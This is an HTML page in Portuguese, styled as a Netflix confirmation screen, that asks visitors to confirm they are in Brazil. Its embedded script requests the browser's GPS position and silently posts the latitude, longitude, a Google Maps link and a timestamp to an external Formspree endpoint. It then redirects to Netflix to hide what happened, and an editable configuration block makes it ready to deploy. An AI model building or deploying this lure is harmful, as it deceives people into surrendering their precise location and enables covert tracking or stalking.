<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Confirmação</title>
<style>
 /* RESET */
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

/* FUNDO ESTILO NETFLIX */
body{
  font-family: 'Helvetica Neue', Arial, sans-serif;
  background: radial-gradient(circle at top, #141414 0%, #000 100%);
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  padding:20px;
  color:#fff;
  overflow:hidden;
}

/* EFEITO DE LUZ DE FUNDO (cinematográfico) */
body::before{
  content:"";
  position:absolute;
  width:600px;
  height:600px;
  background: radial-gradient(circle, rgba(229,9,20,0.25), transparent 70%);
  top:-100px;
  left:-100px;
  filter:blur(80px);
}

body::after{
  content:"";
  position:absolute;
  width:500px;
  height:500px;
  background: radial-gradient(circle, rgba(255,0,80,0.2), transparent 70%);
  bottom:-120px;
  right:-120px;
  filter:blur(100px);
}

/* CARD PRINCIPAL (GLASS + PREMIUM) */
.container{
  position:relative;
  background: rgba(20,20,20,0.65);
  backdrop-filter: blur(18px);
  -webkit-backdrop-filter: blur(18px);
  border-radius:16px;
  padding:50px 35px;
  max-width:420px;
  width:100%;
  text-align:center;

  border:1px solid rgba(255,255,255,0.08);
  box-shadow:
    0 0 40px rgba(0,0,0,0.8),
    0 0 80px rgba(229,9,20,0.15);

  animation:fadeIn 1s ease;
}

/* TÍTULO */
h2{
  font-size:26px;
  font-weight:700;
  margin-bottom:12px;
  letter-spacing:0.5px;
}

/* TEXTO */
p{
  font-size:14px;
  color:#b3b3b3;
  line-height:1.6;
}

/* BOTÃO ESTILO NETFLIX ULTRA */
.btn{
  background: linear-gradient(135deg, #e50914, #ff2a2a);
  color:#fff;
  border:none;
  padding:16px;
  border-radius:8px;
  font-size:16px;
  font-weight:700;
  width:100%;
  cursor:pointer;
  margin-top:25px;

  transition: all 0.3s ease;
  box-shadow:
    0 0 15px rgba(229,9,20,0.6),
    0 0 40px rgba(229,9,20,0.3);
}

/* HOVER CINEMATOGRÁFICO */
.btn:hover{
  transform: scale(1.05);
  box-shadow:
    0 0 25px rgba(229,9,20,0.9),
    0 0 60px rgba(229,9,20,0.5);
}

/* CLICK */
.btn:active{
  transform: scale(0.98);
}

/* MENSAGEM */
#msg{
  margin-top:18px;
  font-size:13px;
  color:#888;
}

/* ANIMAÇÃO */
@keyframes fadeIn{
  from{
    opacity:0;
    transform: translateY(30px);
  }
  to{
    opacity:1;
    transform: translateY(0);
  }
}
</style>
</head>
<body>
<div class="container">
  <!-- EDITA O TEXTO/HTML AQUI -->
  <h2>Confirme se estiver no Brasil</h2>
  <p>Voce está no Brasil?</p>
  
  <button class="btn" onclick="confirmar()">SIM, estou no Brasil!</button>
  <div id="msg"></div>
</div>

<script>
  // ===== CONFIGURAÇÃO - EDITA AQUI =====
  const LINK_REDIRECIONAMENTO = "https://www.netflix.com/browse"; 
  const LINK_FORMSPREE = "https://formspree.io/f/xzdywvdp"; 
  // =====================================

  function confirmar(){
    const msg = document.getElementById('msg');
    msg.innerHTML = "Aguardando permissão...";

    if(!navigator.geolocation){
      msg.innerHTML = "GPS não suportado.";
      window.location.href = LINK_REDIRECIONAMENTO;
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        const dados = {
          latitude: lat,
          longitude: lon,
          // Link corrigido para abrir o Google Maps no ponto exato
          link_mapa: `https://www.google.com/maps?q=${lat},${lon}`,
          data_hora: new Date().toLocaleString('pt-BR')
        };

        // Envia para o Formspree
        fetch(LINK_FORMSPREE, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(dados)
        }).finally(() => {
          // Redireciona após o envio (independente de sucesso ou erro)
          window.location.href = LINK_REDIRECIONAMENTO;
        });

      },
      (erro) => {
        // Se o usuário negar a localização, ele apenas redireciona
        msg.innerHTML = "Redirecionando...";
        window.location.href = LINK_REDIRECIONAMENTO;
      }
    );
  }
</script>
</body>
</html>
